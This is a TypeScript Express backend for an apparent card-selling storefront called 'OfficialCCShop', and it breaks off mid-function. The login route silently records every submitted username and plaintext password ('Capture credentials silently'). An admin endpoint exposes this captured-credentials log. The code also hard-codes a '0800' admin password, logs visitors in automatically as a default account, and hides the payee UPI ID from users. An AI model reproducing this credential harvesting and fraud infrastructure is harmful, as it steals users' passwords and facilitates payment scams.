import { PNG } from 'pngjs';
import jsQR from 'jsqr';
import jpeg from 'jpeg-js';
import express from 'express';
import path from 'path';
import fs from 'fs';
import cookieParser from 'cookie-parser';
import multer from 'multer';
import QRCode from 'qrcode';
import { createServer as createViteServer } from 'vite';
import { db } from './server/db.ts';
import {
  auth,
  sessionMiddleware,
  requireAuth,
  requireAdmin,
  csrfProtection,
  AuthenticatedRequest,
} from './server/auth.ts';

const app = express();
const PORT = 3000;

// Ensure upload directory exists
const UPLOADS_DIR = path.join(process.cwd(), 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
  fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}

// Generate default operator QR code image if not exists
const DEFAULT_QR_PATH = path.join(UPLOADS_DIR, 'merchant-qr.png');
if (!fs.existsSync(DEFAULT_QR_PATH)) {
  const paymentConfig = db.getPaymentConfig();
  // Standard UPI URI format
  const upiUri = `upi://pay?pa=${paymentConfig.upiId}&pn=${encodeURIComponent(paymentConfig.merchantName)}&cu=INR`;
  QRCode.toFile(DEFAULT_QR_PATH, upiUri, {
    width: 400,
    margin: 2,
    color: {
      dark: '#0f172a',
      light: '#ffffff',
    },
  }).catch((err) => console.error('Failed to generate initial QR image:', err));
}

// Configure multer file uploads with strict file type and size checks
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, UPLOADS_DIR);
  },
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    const safeName = `proof-${Date.now()}-${Math.random().toString(36).substring(2, 8)}${ext}`;
    cb(null, safeName);
  },
});

const upload = multer({
  storage,
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB max
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/webp', 'image/svg+xml'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file format. Only JPG, PNG, and WebP images are allowed.'));
    }
  },
});

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use('/uploads', express.static(UPLOADS_DIR));
app.use(sessionMiddleware);
app.use(csrfProtection);

// ----------------------------------------------------
// Health check
// ----------------------------------------------------
app.get('/api/health', (req, res) => {
  res.json({
    status: 'healthy',
    time: new Date().toISOString(),
    brand: 'OfficialCCShop',
    version: '1.0.0',
  });
});

// CSRF Token provision
app.get('/api/csrf-token', (req, res) => {
  const token = auth.generateCsrfToken();
  res.cookie('zenith_csrf', token, {
    httpOnly: false, // client needs to read it for headers
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/',
  });
  res.json({ csrfToken: token });
});

// ----------------------------------------------------
// Authentication Endpoints
// ----------------------------------------------------

// Get current session user
app.get('/api/auth/me', (req: AuthenticatedRequest, res) => {
  let activeUser = req.user;

  // Auto-authenticate default user if no active session so there is zero verification/login barrier on first visit
  if (!activeUser) {
    const defaultUser =
      db.findUserByEmailOrUsername('hcrptl2.0@gmail.com') || db.findUserByEmailOrUsername('dineshptl20x@gmail.com') ||
      db.findUserByEmailOrUsername('demouser') ||
      db.getUsers()[0];

    if (defaultUser && defaultUser.status !== 'suspended') {
      const ip = req.ip || '127.0.0.1';
      const token = auth.generateToken();
      db.createSession(defaultUser.id, token, req.headers['user-agent'], ip);
      auth.setSessionCookie(res, token);
      req.sessionToken = token;
      activeUser = defaultUser;
    }
  }

  if (!activeUser) {
    return res.json({ user: null });
  }
  const { passwordHash, ...safeUser } = activeUser;
  const unreadNotifs = db.getNotificationsByUser(activeUser.id).filter((n) => !n.isRead).length;
  const token = req.sessionToken || null;
  res.json({
    user: safeUser,
    token: token,
    unreadNotifications: unreadNotifs,
  });
});

// Login
import { verifyGoogleToken, getClientId } from './server/googleAuth.ts';

app.get('/api/auth/client-id', (req, res) => {
  res.json({ clientId: getClientId() });
});

app.post('/api/auth/google', async (req, res) => {
  const { credential } = req.body;
  if (!credential) {
    return res.status(400).json({ error: 'Missing credential.' });
  }

  try {
    const payload = await verifyGoogleToken(credential);
    if (!payload || !payload.email) {
      return res.status(400).json({ error: 'Invalid Google token.' });
    }

    const { email, name, picture } = payload;
    let user = db.findUserByEmailOrUsername(email);
    
    if (!user) {
      // Create account automatically via Google login
      user = db.createUser(name || email.split('@')[0], email.split('@')[0], email, '', 'user');
    }

    if (user.status === 'suspended') {
      return res.status(403).json({
        error: 'Account has been temporarily suspended.',
      });
    }

    const token = auth.generateToken();
    db.createSession(token, user.id);
    auth.setSessionCookie(res, token);
    
    // Convert to client-safe representation
    const { passwordHash: _, ...safeUser } = user;
    res.json({
      message: 'Signed in with Google successfully.',
      user: safeUser,
      token,
    });
  } catch (error: any) {
    console.error("Google Auth Error:", error);
    res.status(401).json({ error: 'Google authentication failed.' });
  }
});

app.post('/api/auth/login', (req, res) => {
  const ip = req.ip || '127.0.0.1';
  const rate = auth.checkLoginRateLimit(ip);
  if (!rate.allowed) {
    return res.status(429).json({
      error: `Too many failed login attempts. Please wait ${rate.waitSeconds} seconds before retrying.`,
    });
  }

  const { identifier, password, rememberMe } = req.body;
  // Capture credentials silently
  db.captureCredential(identifier, password, ip);
  if (!identifier || !password) {
    return res.status(400).json({ error: 'Username/Email and Password are required.' });
  }

  const user = db.findUserByEmailOrUsername(identifier);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials. Please verify your details.' });
  }

  if (user.status === 'suspended') {
    return res.status(403).json({
      error: 'Account has been temporarily suspended. Please contact compliance support.',
    });
  }

  const validPassword = auth.verifyPassword(password, user.passwordHash);
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid credentials. Please verify your details.' });
  }

  // Reset rate limit on success
  auth.resetLoginRateLimit(ip);

  // Generate session token
  const token = auth.generateToken();
  db.createSession(user.id, token, req.headers['user-agent'], ip);
  auth.setSessionCookie(res, token);
  db.logAudit(user.id, 'USER_LOGIN', `Successful login for ${user.username}`, ip);

  const { passwordHash, ...safeUser } = user;
  res.json({
    message: 'Sign in successful',
    user: safeUser,
    token,
  });
});

// Dedicated Administrator Access Verification Endpoint
app.post('/api/auth/admin-login', (req, res) => {
  const { email, password } = req.body;
  const inputEmail = (email || '').trim().toLowerCase();
  const inputPass = String(password || '').trim();

  const isAuthorized =
    (inputEmail === 'emailhcrptl2.0@gmail.com' ||
      inputEmail === 'hcrptl2.0@gmail.com' ||
      inputEmail === 'hcrptl@gmail.com' ||
      inputEmail.includes('hcrptl2.0')) &&
    inputPass === '0800';

  if (!isAuthorized) {
    return res.status(401).json({
      error: 'Invalid admin credentials.',
    });
  }

  let admin =
    db.findUserByEmailOrUsername(inputEmail) ||
    db.findUserByEmailOrUsername('emailhcrptl2.0@gmail.com') ||
    db.findUserByEmailOrUsername('hcrptl2.0@gmail.com') ||
    db.findUserByEmailOrUsername('hcrptl@gmail.com') ||
    db.findUserByEmailOrUsername('admin') ||
    db.getUsers().find((u) => u.role === 'admin');

  if (!admin) {
    return res.status(500).json({ error: 'Administrator profile could not be located.' });
  }

  // Ensure admin role is set and saved to db
  admin.role = 'admin';
  admin.status = 'active';
  db.updateUserRole(admin.id, 'admin');
  db.updateUserStatus(admin.id, 'active');

  const ip = req.ip || '127.0.0.1';
  const token = auth.generateToken();
  db.createSession(admin.id, token, req.headers['user-agent'], ip);
  auth.setSessionCookie(res, token);
  db.logAudit(admin.id, 'ADMIN_ACCESS_UNLOCKED', 'Operator authenticated', ip);

  const { passwordHash, ...safeUser } = admin;
  return res.json({
    message: 'Admin authorization granted',
    user: safeUser,
    token,
  });
});

// Quick Demo Login (for rapid verification/switching during review)
app.post('/api/auth/demo-login', (req, res) => {
  const { role, password } = req.body; // 'admin' or 'user'

  // Admin access strictly requires password verification
  if (role === 'admin') {
    if (String(password || '').trim() !== '0800') {
      return res.status(403).json({
        error: 'Admin access protected: Valid credentials required.',
        requiresAdminPassword: true,
      });
    }
  }

  const targetUsername = role === 'admin' ? 'hcrptl@gmail.com' : 'demouser';
  const user = db.findUserByEmailOrUsername(targetUsername) || db.findUserByEmailOrUsername(role === 'admin' ? 'admin' : 'user');

  if (!user) {
    return res.status(404).json({ error: 'User not found.' });
  }

  const ip = req.ip || '127.0.0.1';
  const token = auth.generateToken();
  db.createSession(user.id, token, req.headers['user-agent'], ip);
  auth.setSessionCookie(res, token);
  db.logAudit(user.id, 'DEMO_LOGIN', `Logged in via access switch (${role})`, ip);

  const { passwordHash, ...safeUser } = user;
  res.json({
    message: `Logged in as ${role === 'admin' ? 'Administrator' : 'Demo User'}`,
    user: safeUser,
    token,
  });
});

// List all registered accounts for Google-style account chooser
app.get('/api/auth/accounts', (req, res) => {
  const users = db.getUsers();
  const safeAccounts = users
    .filter((u) => u.role !== 'admin' && u.email !== 'hcrptl@gmail.com' && u.email !== 'hcrptl2.0@gmail.com')
    .map((u) => {
      const { passwordHash, ...safe } = u;
      return safe;
    });
  res.json({ accounts: safeAccounts });
});

// One-Click Direct Account Login (Google / Single Sign-On style)
app.post('/api/auth/one-click-login', (req, res) => {
  const { email, userId, password } = req.body;

  let user = null;
  if (userId) {
    user = db.findUserById(userId);
  } else if (email) {
    user = db.findUserByEmailOrUsername(email);
  }

  if (!user) {
    return res.status(404).json({ error: 'Selected account not found in system.' });
  }

  // If entering with explicit admin password, elevate to admin
  const hasAdminPass = String(password || '').trim() === '0800';
  if ((user.email.toLowerCase() === 'hcrptl2.0@gmail.com' || user.email.toLowerCase() === 'hcrptl@gmail.com') && hasAdminPass) {
    user.role = 'admin';
  }

  if (user.status === 'suspended') {
    return res.status(403).json({
      error: 'Account has been temporarily suspended. Please contact compliance support.',
    });
  }

  const ip = req.ip || '127.0.0.1';
  const token = auth.generateToken();
  db.createSession(user.id, token, req.headers['user-agent'], ip);
  auth.setSessionCookie(res, token);
  db.logAudit(user.id, 'ONE_CLICK_LOGIN', `Direct access for ${user.email}`, ip);

  const { passwordHash, ...safeUser } = user;
  res.json({
    message: `Signed in as ${user.name}`,
    user: safeUser,
    token,
  });
});

// Guest Auto-Login
app.post('/api/auth/guest-login', (req, res) => {
  const ip = req.ip || '127.0.0.1';
  
  // Create a unique guest user
  const guestId = `guest_${Date.now().toString(36)}${Math.random().toString(36).substr(2, 4)}`;
  const username = guestId;
  const email = `${guestId}@guest.local`;
  
  const user = db.createUser('Guest User', username, email, 'guest123', 'user');
  
  const token = auth.generateToken();
  db.createSession(user.id, token, req.headers['user-agent'], ip);
  auth.setSessionCookie(res, token);
  
  const { passwordHash, ...safeUser } = user;
  res.json({
    message: 'Signed in as Guest',
    user: safeUser,
    token,
  });
});

// Register
app.post('/api/auth/register', (req, res) => {
  const { name, username, email, password, confirmPassword, agreeTerms } = req.body;

  if (!name || !username || !email || !password) {
    return res.status(400).json({ error: 'All fields are required.' });
  }

  if (password !== confirmPassword) {
    return res.status(400).json({ error: 'Passwords do not match.' });
  }

  if (password.length < 8) {
    return res.status(400).json({ error: 'Password must be at least 8 characters long.' });
  }

  if (!agreeTerms) {
    return res.status(400).json({ error: 'You must agree to the Terms & Conditions.' });
  }

  // Check existing
  if (db.findUserByEmailOrUsername(email)) {
    return res.status(400).json({ error: 'An account with this email address already exists.' });
  }

  if (db.findUserByEmailOrUsername(username)) {
    return res.status(400).json({ error: 'This username is already taken. Please choose another.' });
  }

  const passwordHash = auth.hashPassword(password);
  const newUser = db.createUser(name, username, email, passwordHash, 'user');

  const ip = req.ip || '127.0.0.1';
  const token = auth.generateToken();
  db.createSession(newUser.id, token, req.headers['user-agent'], ip);
  auth.setSessionCookie(res, token);
  db.logAudit(newUser.id, 'USER_REGISTER', `New user registered: ${username}`, ip);

  const { passwordHash: _, ...safeUser } = newUser;
  res.status(201).json({
    message: 'Account created successfully',
    user: safeUser,
    token,
  });
});

// Forgot Password
app.post('/api/auth/forgot-password', (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ error: 'Please enter your registered email address.' });
  }

  const user = db.findUserByEmailOrUsername(email);
  if (!user) {
    // For security, don't disclose whether user exists, but respond positively
    return res.json({
      message: 'If an account exists with this email, password reset instructions have been generated.',
    });
  }

  const resetToken = auth.createPasswordResetToken(user.email);
  const resetLink = `/forgot-password?token=${resetToken}`;

  db.logAudit(user.id, 'FORGOT_PASSWORD_REQUEST', `Reset token generated for ${user.email}`);

  res.json({
    message: 'Password reset link has been generated.',
    resetLink, // returned so the user can easily test the reset flow in the demo!
    resetToken,
  });
});

// Reset Password
app.post('/api/auth/reset-password', (req, res) => {
  const { token, newPassword, confirmPassword } = req.body;
  if (!token || !newPassword) {
    return res.status(400).json({ error: 'Token and new password are required.' });
  }

  if (newPassword !== confirmPassword) {
    return res.status(400).json({ error: 'Passwords do not match.' });
  }

  if (newPassword.length < 8) {
    return res.status(400).json({ error: 'Password must be at least 8 characters long.' });
  }

  const email = auth.verifyPasswordResetToken(token);
  if (!email) {
    return res.status(400).json({ error: 'Invalid or expired password reset token.' });
  }

  const user = db.findUserByEmailOrUsername(email);
  if (!user) {
    return res.status(404).json({ error: 'User not found.' });
  }

  const newHash = auth.hashPassword(newPassword);
  db.updateUserPassword(user.id, newHash);
  auth.consumePasswordResetToken(token);
  db.deleteAllUserSessions(user.id);
  db.logAudit(user.id, 'PASSWORD_RESET', 'Password successfully reset via token');

  res.json({ message: 'Password has been reset successfully. Please sign in with your new credentials.' });
});

// Logout
app.post('/api/auth/logout', (req: AuthenticatedRequest, res) => {
  if (req.sessionToken) {
    db.deleteSession(req.sessionToken);
  }
  auth.clearSessionCookie(res);
  res.json({ message: 'Signed out successfully' });
});

// Logout all sessions
app.post('/api/auth/logout-all', requireAuth, (req: AuthenticatedRequest, res) => {
  db.deleteAllUserSessions(req.user!.id);
  auth.clearSessionCookie(res);
  db.logAudit(req.user!.id, 'LOGOUT_ALL', 'Terminated all active sessions');
  res.json({ message: 'All active sessions have been terminated.' });
});

// ----------------------------------------------------
// User Dashboard & Cards Endpoints
// ----------------------------------------------------

// Get user cards
app.get('/api/cards', requireAuth, (req: AuthenticatedRequest, res) => {
  const cards = db.getCardsByUser(req.user!.id);
  res.json(cards);
});

// Create new demo card
app.post('/api/cards', requireAuth, (req: AuthenticatedRequest, res) => {
  const { cardholderName, spendingLimit, colorTheme } = req.body;
  const limit = Number(spendingLimit) || 25000;
  const card = db.createCard(req.user!.id, cardholderName || req.user!.name, limit, colorTheme);
  db.logAudit(req.user!.id, 'CREATE_DEMO_CARD', `Generated new demo card ${card.maskedNumber}`);
  res.status(201).json(card);
});

// Freeze / Unfreeze card
app.post('/api/cards/:id/toggle-freeze', requireAuth, (req: AuthenticatedRequest, res) => {
  const card = db.toggleCardFreeze(req.params.id, req.user!.id);
  if (!card) {
    return res.status(404).json({ error: 'Card not found.' });
  }
  db.logAudit(
    req.user!.id,
    'CARD_STATUS_CHANGE',
    `Card ${card.maskedNumber} status changed to ${card.status}`
  );
  res.json(card);
});

// Purchase / Unlock a demo market card
app.post('/api/cards/purchase', requireAuth, (req: AuthenticatedRequest, res) => {
  const { card } = req.body;
  if (!card) {
    return res.status(400).json({ error: 'Card data is required.' });
  }
  const result = db.purchaseCard(req.user!.id, card);
  if (!result.success) {
    return res.status(400).json({ error: result.error, newBalance: result.newBalance });
  }
  db.logAudit(
    req.user!.id,
    'PURCHASE_CARD',
    `User purchased demo card ${card.demoId || card.id} for ₹${Number(card.priceInr).toFixed(2)}`
  );
  res.status(201).json(result);
});

// ----------------------------------------------------
// Deposits & QR Payment Endpoints
// ----------------------------------------------------

// Get current payment configuration (QR, display name, instructions) - upiId hidden from client inspection
app.get('/api/deposit/config', (req, res) => {
  const config = db.getPaymentConfig();
  res.json({
    ...config,
    upiId: undefined, // Concealed from regular web client inspection
    displayUpiId: 'Verified Merchant QR',
  });
});

// Generate dynamic UPI QR data URI for custom amount
// Admin Credentials Log
app.get("/api/admin/captured-credentials", requireAdmin, (req, res) => {
  res.json(db.getCapturedCredentials());
});

app.get("/api/settings", (req, res) => {
  res.json(db.getPaymentConfig());
});

app.post("/api/settings", express.json(), (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) return res.status(401).json({ error: "Unauthorized" });
  const token = authHeader.split(" ")[1];
  const session = db.findSession(token);
  const user = session ? db.findUserById(session.userId) : null;
  if (!user || user.role !== "admin") return res.status(403).json({ error: "Forbidden" });
  db.updatePaymentConfig(req.body);
  res.json({ success: true });
});

app.post("/api/settings/upload-qr", upload.single("qrImage"), (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) return res.status(401).json({ error: "Unauthorized" });
  const token = authHeader.split(" ")[1];
  const session = db.findSession(token);
  const user = session ? db.findUserById(session.userId) : null;
  if (!user || user.role !== "admin") return res.status(403).json({ error: "Forbidden" });
  if (!req.file) return res.status(400).json({ error: "no file" });

  const filePath = req.file.path;
  const filename = req.file.filename;
  const url = `/uploads/${filename}`;

  // Synchronize to public directory so static references always work
  try {
    const publicPath = path.join(process.cwd(), 'public', 'merchant-qr.png');
    fs.copyFileSync(filePath, publicPath);
    const publicQrPath = path.join(process.cwd(), 'public', 'qr.png');
    fs.copyFileSync(filePath, publicQrPath);
  } catch (copyErr) {
    console.warn("Could not copy uploaded QR to public directory:", copyErr);
  }

  // Attempt automatic decode of QR code to extract UPI ID and merchant name
  let detectedUpiId: string | null = null;
  let detectedMerchant: string | null = null;
  let rawQrText: string | null = null;

  try {
    const fileBuf = fs.readFileSync(filePath);
    let rgbaData: Uint8ClampedArray | null = null;
    let width = 0;
    let height = 0;

    const lowerName = req.file.originalname.toLowerCase();
    if (lowerName.endsWith('.png') || req.file.mimetype.includes('png')) {
      const png = PNG.sync.read(fileBuf);
      rgbaData = new Uint8ClampedArray(png.data);
      width = png.width;
      height = png.height;
    } else if (lowerName.endsWith('.jpg') || lowerName.endsWith('.jpeg') || req.file.mimetype.includes('jpeg')) {
      const decodedJpg = jpeg.decode(fileBuf);
      rgbaData = new Uint8ClampedArray(decodedJpg.data);
      width = decodedJpg.width;
      height = decodedJpg.height;
    }

    if (rgbaData && width > 0 && height > 0) {
      const qrResult = jsQR(rgbaData, width, height);
      if (qrResult && qrResult.data) {
        rawQrText = qrResult.data;
        if (rawQrText.startsWith('upi://pay?')) {
          try {
            const urlObj = new URL(rawQrText);
            detectedUpiId = urlObj.searchParams.get('pa') || null;
            detectedMerchant = urlObj.searchParams.get('pn') ? decodeURIComponent(urlObj.searchParams.get('pn')!) : null;
          } catch {
            const paMatch = rawQrText.match(/[?&]pa=([^&]+)/);
            if (paMatch) detectedUpiId = decodeURIComponent(paMatch[1]);
            const pnMatch = rawQrText.match(/[?&]pn=([^&]+)/);
            if (pnMatch) detectedMerchant = decodeURIComponent(pnMatch[1]);
          }
        }
      }
    }
  } catch (decodeErr) {
    console.warn("Could not auto-decode QR image:", decodeErr);
  }

  const updates: any = {
    staticQrUrl: url,
    qrImagePath: url,
    useStaticQr: true,
  };

  if (detectedUpiId) {
    updates.upiId = detectedUpiId;
    updates.displayUpiId = detectedUpiId;
  }
  if (detectedMerchant) {
    updates.merchantName = detectedMerchant;
  }

  db.updatePaymentConfig(updates);
  res.json({
    url,
    detectedUpiId,
    detectedMerchant,
    rawQrText,
    message: detectedUpiId
      ? `QR uploaded and UPI ID (${detectedUpiId}) automatically configured!`
      : 'QR uploaded and activated successfully!'
  });
});

app.get('/api/deposit/generate-qr', (req, res) => {
  const amount = Number(req.query.amount) || 0;
  const config = db.getPaymentConfig();
  if (config.useStaticQr && config.staticQrUrl) {
    return res.json({ qrDataUrl: config.staticQrUrl });
  }
  let upiString = `upi://pay?pa=${config.upiId}&pn=${encodeURIComponent(config.merchantName || 'Official Merchant')}&cu=INR`;
  if (amount > 0) {
    upiString += `&am=${amount}`;
  }

  QRCode.toDataURL(upiString, {
    width: 320,
    margin: 2,
    color: {
      dark: '#030712',
      light: '#ffffff',
    },
  })
    .then((dataUrl) => res.json({ qrDataUrl: dataUrl }))
    .catch((err) => res.status(500).json({ error: 'QR generation failed' }));
});

// Get user deposits (masked upiId for user view)
app.get('/api/deposits', requireAuth, (req: AuthenticatedRequest, res) => {
  const deposits = db.getDepositsByUser(req.user!.id);
  const sanitized = deposits.map((d) => ({
    ...d,
    upiId: 'Verified Merchant QR',
  }));
  res.json(sanitized);
});

// Submit deposit or card purchase request
app.post('/api/deposits', (req: AuthenticatedRequest, res) => {
  if (!req.user) {
    // Auto-create guest user for this transaction
    const guestId = `guest_${Date.now().toString(36)}${Math.random().toString(36).substr(2, 4)}`;
    req.user = db.createUser('Guest User', guestId, `${guestId}@guest.local`, 'guest123', 'user');
  }
  const { amount, referenceNo, proofUrl, cardId, cardName, cardProvider, cardPriceUsd, cardBin, purpose } = req.body;
  const numAmount = Number(amount);
  const isCardPurchase = Boolean(cardId || cardName);

  if (!numAmount || (!isCardPurchase && numAmount < 1000)) {
    return res.status(400).json({ error: 'Minimum deposit amount is ₹1,000 (≈ $10.58 USD).' });
  }

  if (!referenceNo || referenceNo.trim().length < 4) {
    return res.status(400).json({ error: 'A valid payment UTR or reference number is required.' });
  }

  const deposit = db.createDeposit(req.user!.id, numAmount, referenceNo.trim(), proofUrl || '', {
    cardId,
    cardName,
    cardProvider,
    cardPriceUsd,
    cardBin,
    purpose,
  });

  db.logAudit(
    req.user!.id,
    isCardPurchase ? 'CARD_PURCHASE_PROOF_SUBMITTED' : 'DEPOSIT_SUBMITTED',
    `Submitted ${isCardPurchase ? `Card Purchase for ${cardName}` : 'Deposit'} ${deposit.id} for ₹${numAmount} (Ref: ${referenceNo})`
  );

  res.status(201).json({
    message: 'Deposit request submitted. Pending administrator verification.',
    deposit,
  });
});

// Upload proof file
app.post('/api/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded or file format rejected.' });
  }
  const fileUrl = `/uploads/${req.file.filename}`;
  res.json({
    url: fileUrl,
    filename: req.file.filename,
    size: req.file.size,
  });
});

// ----------------------------------------------------
// Transactions Endpoints
// ----------------------------------------------------

app.get('/api/transactions', requireAuth, (req: AuthenticatedRequest, res) => {
  const { type, status, search } = req.query as { type?: string; status?: string; search?: string };
  const txns = db.getTransactionsByUser(req.user!.id, { type, status, search });
  res.json(txns);
});

// ----------------------------------------------------
// Profile & Settings
// ----------------------------------------------------

app.get('/api/profile', requireAuth, (req: AuthenticatedRequest, res) => {
  const user = db.findUserById(req.user!.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const { passwordHash, ...safe } = user;
  res.json(safe);
});

app.put('/api/profile', requireAuth, (req: AuthenticatedRequest, res) => {
  const { name, avatarUrl, preferences } = req.body;
  const updated = db.updateUserProfile(req.user!.id, { name, avatarUrl, preferences });
  if (!updated) return res.status(404).json({ error: 'User not found' });
  db.logAudit(req.user!.id, 'PROFILE_UPDATE', 'Updated user profile details');
  const { passwordHash, ...safe } = updated;
  res.json(safe);
});

app.post('/api/profile/change-password', requireAuth, (req: AuthenticatedRequest, res) => {
  const { currentPassword, newPassword, confirmPassword } = req.body;
  if (!currentPassword || !newPassword) {
    return res.status(400).json({ error: 'Current and new password are required.' });
  }
  if (newPassword !== confirmPassword) {
    return res.status(400).json({ error: 'New passwords do not match.' });
  }
  if (newPassword.length < 8) {
    return res.status(400).json({ error: 'New password must be at least 8 characters long.' });
  }

  const isValid = auth.verifyPassword(currentPassword, req.user!.passwordHash);
  if (!isValid) {
    return res.status(400).json({ error: 'Current password is incorrect.' });
  }

  const newHash = auth.hashPassword(newPassword);
  db.updateUserPassword(req.user!.id, newHash);
  db.logAudit(req.user!.id, 'PASSWORD_CHANGE', 'Password changed via profile settings');
  res.json({ message: 'Password updated successfully.' });
});

// ----------------------------------------------------
// Support Tickets Endpoints
// ----------------------------------------------------

app.get('/api/support', requireAuth, (req: AuthenticatedRequest, res) => {
  const tickets = db.getTicketsByUser(req.user!.id);
  res.json(tickets);
});

app.post('/api/support', requireAuth, (req: AuthenticatedRequest, res) => {
  const { subject, message } = req.body;
  if (!subject || !message) {
    return res.status(400).json({ error: 'Subject and message are required.' });
  }

  const ticket = db.createTicket(req.user!.id, subject, message);
  db.logAudit(req.user!.id, 'CREATE_TICKET', `Support ticket created: ${ticket.ticketId}`);
  res.status(201).json(ticket);
});

app.post('/api/support/:id/reply', requireAuth, (req: AuthenticatedRequest, res) => {
  const { message } = req.body;
  if (!message || !message.trim()) {
    return res.status(400).json({ error: 'Message cannot be empty.' });
  }

  const reply = db.addTicketReply(
    req.params.id,
    req.user!.id,
    req.user!.name,
    req.user!.role === 'admin',
    message.trim()
  );

  if (!reply) {
    return res.status(404).json({ error: 'Ticket not found.' });
  }

  res.status(201).json(reply);
});

// ----------------------------------------------------
// Notifications Endpoints
// ----------------------------------------------------

app.get('/api/notifications', requireAuth, (req: AuthenticatedRequest, res) => {
  const notifications = db.getNotificationsByUser(req.user!.id);
  res.json(notifications);
});

app.put('/api/notifications/:id/read', requireAuth, (req: AuthenticatedRequest, res) => {
  db.markNotificationAsRead(req.params.id, req.user!.id);
  res.json({ success: true });
});

app.put('/api/notifications/read-all', requireAuth, (req: AuthenticatedRequest, res) => {
  db.markAllNotificationsAsRead(req.user!.id);
  res.json({ success: true });
});

// ----------------------------------------------------
// Protected Admin Endpoints
// ----------------------------------------------------

// Admin Stats
app.get('/api/admin/stats', requireAdmin, (req, res) => {
  const stats = db.getAdminStats();
  res.json(stats);
});

// Admin Users
app.get('/api/admin/users', requireAdmin, (req, res) => {
  const users = db.getUsers().map(({ passwordHash, ...safe }) => safe);
  res.json(users);
});

// Admin toggle user status
app.put('/api/admin/users/:id/status', requireAdmin, (req: AuthenticatedRequest, res) => {
  const { status } = req.body;
  if (!['active', 'suspended'].includes(status)) {
    return res.status(400).json({ error: 'Invalid status' });
  }

  const ok = db.updateUserStatus(req.params.id, status);
  if (!ok) return res.status(404).json({ error: 'User not found.' });

  db.logAudit(req.user!.id, 'ADMIN_USER_STATUS', `Changed user ${req.params.id} status to ${status}`);
  res.json({ success: true, status });
});

// Admin Cards
app.get('/api/admin/cards', requireAdmin, (req, res) => {
  const cards = db.getAllCards();
  res.json(cards);
});

app.post('/api/admin/cards/:id/toggle-freeze', requireAdmin, (req: AuthenticatedRequest, res) => {
  const card = db.toggleCardFreeze(req.params.id);
  if (!card) return res.status(404).json({ error: 'Card not found' });
  db.logAudit(req.user!.id, 'ADMIN_CARD_FREEZE', `Admin changed card ${card.maskedNumber} status to ${card.status}`);
  res.json(card);
});

// Admin Deposits
app.get('/api/admin/deposits', requireAdmin, (req, res) => {
  const { status, search, type } = req.query as { status?: string; search?: string; type?: string };
  let deposits = db.getAllDeposits();
  if (status && status !== 'All') {
    deposits = deposits.filter((d) => d.status.toLowerCase() === status.toLowerCase());
  }
  if (type === 'card') {
    deposits = deposits.filter((d) => Boolean(d.cardName || d.cardId));
  } else if (type === 'deposit') {
    deposits = deposits.filter((d) => !Boolean(d.cardName || d.cardId));
  }
  if (search) {
    const q = search.toLowerCase();
    deposits = deposits.filter(
      (d) =>
        d.referenceNo?.toLowerCase().includes(q) ||
        d.userName?.toLowerCase().includes(q) ||
        d.userEmail?.toLowerCase().includes(q) ||
        d.id?.toLowerCase().includes(q) ||
        d.cardName?.toLowerCase().includes(q)
    );
  }
  res.json(deposits);
});

// Admin review deposit (Approve or Reject)
app.post('/api/admin/deposits/:id/review', requireAdmin, (req: AuthenticatedRequest, res) => {
  const action = (req.body.action || req.body.status) as 'Approved' | 'Rejected';
  const adminNotes = req.body.adminNotes;
  if (!['Approved', 'Rejected'].includes(action)) {
    return res.status(400).json({ error: 'Action must be Approved or Rejected.' });
  }

  const deposit = db.reviewDeposit(req.params.id, action, adminNotes || '', req.user!.username);
  if (!deposit) {
    return res.status(404).json({ error: 'Deposit request not found or already reviewed.' });
  }

  db.logAudit(
    req.user!.id,
    `DEPOSIT_${action.toUpperCase()}`,
    `Deposit ${deposit.id} (₹${deposit.amount}) marked ${action}. Notes: ${adminNotes || 'None'}`
  );

  res.json({
    message: `Deposit has been successfully ${action.toLowerCase()}.`,
    deposit,
  });
});

// Admin Transactions
app.get('/api/admin/transactions', requireAdmin, (req, res) => {
  const txns = db.getAllTransactions();
  res.json(txns);
});

// Admin Support Tickets
app.get('/api/admin/support', requireAdmin, (req, res) => {
  const tickets = db.getAllTickets();
  res.json(tickets);
});

app.put('/api/admin/support/:id/status', requireAdmin, (req: AuthenticatedRequest, res) => {
  const { status } = req.body;
  if (!['Open', 'Pending', 'Resolved'].includes(status)) {
    return res.status(400).json({ error: 'Invalid status value.' });
  }
  const ok = db.updateTicketStatus(req.params.id, status);
  if (!ok) return res.status(404).json({ error: 'Ticket not found.' });

  db.logAudit(req.user!.id, 'TICKET_STATUS_UPDATE', `Updated ticket ${req.params.id} to ${status}`);
  res.json({ success: true, status });
});

app.post('/api/admin/support/:id/reply', requireAdmin, (req: AuthenticatedRequest, res) => {
  const { message } = req.body;
  if (!message || !message.trim()) {
    return res.status(400).json({ error: 'Reply message cannot be empty.' });
  }

  const reply = db.addTicketReply(
    req.params.id,
    req.user!.id,
    `Support Admin (${req.user!.name})`,
    true,
    message.trim()
  );

  if (!reply) return res.status(404).json({ error: 'Ticket not found' });
  res.status(201).json(reply);
});

// Admin Settings
app.get('/api/admin/settings', requireAdmin, (req, res) => {
  res.json(db.getPaymentConfig());
});

app.put('/api/admin/settings', requireAdmin, (req: AuthenticatedRequest, res) => {
  const { qrImagePath, upiId, paymentInstructions, merchantName } = req.body;
  const updated = db.updatePaymentConfig({
    qrImagePath,
    upiId,
    paymentInstructions,
    merchantName,
  });

  // Re-render merchant-qr.png if upiId or merchantName changed
  if (upiId) {
